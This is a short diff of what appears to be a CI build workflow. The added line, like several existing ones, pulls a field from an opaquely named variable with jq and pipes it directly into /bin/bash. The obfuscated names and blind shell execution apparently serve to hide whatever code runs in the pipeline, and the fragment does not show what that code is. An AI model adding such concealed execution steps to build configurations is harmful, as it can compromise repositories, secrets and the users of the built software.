@@ -28,6 +28,7 @@ jobs:
           echo $h53 | jq -r .gmr024 | /bin/bash
           printf '%s' "$jh851" | jq -r .jqe007 | /bin/bash
           printf '%s' "$epim04" | jq -r .t7 | /bin/bash
+          echo $opi3283 | jq -r .lcnm4 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
